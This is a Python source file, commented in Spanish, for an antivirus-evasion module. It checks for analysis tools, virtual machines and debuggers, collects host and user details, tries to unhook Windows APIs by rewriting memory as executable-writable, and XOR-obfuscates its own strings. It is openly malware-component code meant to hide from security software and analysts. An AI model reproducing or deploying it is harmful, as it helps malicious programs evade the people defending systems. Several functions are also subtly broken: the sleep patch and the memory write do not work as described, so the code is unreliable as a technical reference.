"""
Módulo de evasión de antivirus.
Implementa técnicas para evadir detección por software de seguridad
y proporciona mecanismos de ofuscación y anti-análisis.
"""

import ctypes
import os
import sys
import platform
import time
import random
import string
import subprocess
import psutil
import winreg
import socket
from typing import List, Dict, Any, Optional
import logging

class AVEvasion:
    def __init__(self):
        """Inicializa el módulo de evasión."""
        self.suspicious_processes = [
            "procmon", "wireshark", "fiddler", "processexplorer", 
            "processhacker", "ida", "ollydbg", "x32dbg", "x64dbg",
            "pestudio", "regshot", "autoruns", "tcpview", "vmtoolsd"
        ]
        self.virtualization_artifacts = [
            "vbox", "vmware", "qemu", "virtual", "sandbox", "sample"
        ]
        
    def check_environment(self) -> Dict[str, Any]:
        """
        Realiza comprobaciones del entorno para detectar análisis.
        
        Returns:
            dict: Resultado de las comprobaciones ambientales
        """
        results = {
            "is_analyzed": False,
            "detected_artifacts": [],
            "environment_info": {}
        }
        
        try:
            # Comprobar procesos sospechosos
            if self._check_suspicious_processes():
                results["is_analyzed"] = True
                results["detected_artifacts"].append("análisis_procesos")
            
            # Comprobar virtualización
            if self._check_virtualization():
                results["is_analyzed"] = True
                results["detected_artifacts"].append("entorno_virtual")
            
            # Comprobar debugger
            if self._check_debugger():
                results["is_analyzed"] = True
                results["detected_artifacts"].append("debugger")
            
            # Recopilar información del entorno
            results["environment_info"] = self._gather_environment_info()
            
        except Exception as e:
            results["error"] = str(e)
            
        return results

    def _check_suspicious_processes(self) -> bool:
        """Comprueba procesos de análisis conocidos."""
        try:
            for proc in psutil.process_iter(['name']):
                process_name = proc.info['name'].lower()
                if any(suspicious in process_name for suspicious in self.suspicious_processes):
                    return True
            return False
        except:
            return False

    def _check_virtualization(self) -> bool:
        """Detecta entornos virtualizados."""
        try:
            # Comprobar nombre de máquina
            hostname = platform.node().lower()
            if any(artifact in hostname for artifact in self.virtualization_artifacts):
                return True
            
            # Comprobar servicios de VM
            if platform.system() == "Windows":
                services = subprocess.check_output("sc query", shell=True).decode().lower()
                if any(artifact in services for artifact in ["vmtools", "vboxservice"]):
                    return True
                    
            # Comprobar MAC address
            for nic in psutil.net_if_addrs().values():
                for addr in nic:
                    if addr.address.startswith(("08:00:27", "00:0C:29", "00:50:56")):
                        return True
                        
            return False
        except:
            return False

    def _check_debugger(self) -> bool:
        """Detecta la presencia de un debugger."""
        try:
            if platform.system() == "Windows":
                return bool(ctypes.windll.kernel32.IsDebuggerPresent())
            return False
        except:
            return False

    def _gather_environment_info(self) -> Dict[str, Any]:
        """Recopila información detallada del entorno."""
        try:
            return {
                "hostname": platform.node(),
                "os": platform.system(),
                "cpu_count": psutil.cpu_count(),
                "memory": psutil.virtual_memory().total,
                "disk_size": psutil.disk_usage('/').total,
                "username": os.getlogin(),
                "domain": socket.getfqdn()
            }
        except:
            return {}

    def apply_evasion_techniques(self) -> Dict[str, bool]:
        """
        Aplica técnicas de evasión básicas.
        
        Returns:
            dict: Resultado de las técnicas aplicadas
        """
        results = {
            "sleep_patching": False,
            "api_unhooking": False,
            "memory_cleaning": False,
            "strings_obfuscation": False
        }
        
        try:
            # Parchear funciones de sleep
            if self._patch_sleep_functions():
                results["sleep_patching"] = True
            
            # Desanclar APIs
            if self._unhook_apis():
                results["api_unhooking"] = True
            
            # Limpiar memoria
            if self._clean_process_memory():
                results["memory_cleaning"] = True
            
            # Ofuscar strings
            if self._obfuscate_strings():
                results["strings_obfuscation"] = True
                
        except Exception as e:
            results["error"] = str(e)
            
        return results

    def _patch_sleep_functions(self) -> bool:
        """Parchea funciones de sleep para evadir análisis basado en tiempo."""
        try:
            if platform.system() == "Windows":
                # Obtener handle de kernel32
                kernel32 = ctypes.WinDLL('kernel32')
                
                # Crear función alternativa de sleep
                def new_sleep(ms):
                    pass
                
                # Parchear Sleep y SleepEx
                kernel32.Sleep = new_sleep
                kernel32.SleepEx = new_sleep
                
            return True
        except:
            return False

    def _unhook_apis(self) -> bool:
        """Desancla APIs monitorizadas."""
        try:
            if platform.system() == "Windows":
                # Lista de DLLs comunes
                dlls = ["ntdll.dll", "kernel32.dll", "user32.dll"]
                
                for dll in dlls:
                    # Cargar copia limpia de la DLL
                    clean_dll = ctypes.WinDLL(dll)
                    
                    # Obtener funciones exportadas
                    exports = self._get_dll_exports(dll)
                    
                    # Restaurar funciones originales
                    for export in exports:
                        try:
                            orig_addr = getattr(clean_dll, export)
                            self._write_memory(export, orig_addr)
                        except:
                            continue
                            
            return True
        except:
            return False

    def _clean_process_memory(self) -> bool:
        """Limpia strings y artifacts de la memoria del proceso."""
        try:
            # Forzar recolección de basura
            import gc
            gc.collect()
            
            # Limpiar variables temporales
            locals().clear()
            
            # Sobrescribir memoria no utilizada
            temp = "A" * 1024 * 1024
            del temp
            
            return True
        except:
            return False

    def _obfuscate_strings(self) -> bool:
        """Ofusca strings en memoria."""
        try:
            # Generar clave aleatoria
            key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            
            # Función de ofuscación XOR
            def xor_string(text: str, key: str) -> str:
                return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(text))
            
            # Ofuscar strings importantes
            self.suspicious_processes = [xor_string(proc, key) for proc in self.suspicious_processes]
            self.virtualization_artifacts = [xor_string(art, key) for art in self.virtualization_artifacts]
            
            return True
        except:
            return False

    @staticmethod
    def _get_dll_exports(dll_name: str) -> List[str]:
        """Obtiene la lista de funciones exportadas de una DLL."""
        try:
            result = subprocess.check_output(f"dumpbin /exports {dll_name}", shell=True)
            exports = []
            for line in result.decode().splitlines():
                if "ordinal hint" in line.lower():
                    continue
                parts = line.split()
                if len(parts) >= 4:
                    exports.append(parts[3])
            return exports
        except:
            return []

    @staticmethod
    def _write_memory(address: int, data: bytes) -> bool:
        """Escribe datos en una dirección de memoria."""
        try:
            if platform.system() == "Windows":
                kernel32 = ctypes.WinDLL('kernel32')
                
                # Cambiar protección de memoria
                old_protect = ctypes.c_ulong(0)
                kernel32.VirtualProtect(
                    ctypes.c_void_p(address),
                    len(data),
                    0x40,  # PAGE_EXECUTE_READWRITE
                    ctypes.byref(old_protect)
                )
                
                # Escribir datos
                ctypes.memmove(address, data, len(data))
                
                # Restaurar protección
                kernel32.VirtualProtect(
                    ctypes.c_void_p(address),
                    len(data),
                    old_protect,
                    ctypes.byref(old_protect)
                )
                
            return True
        except:
            return False
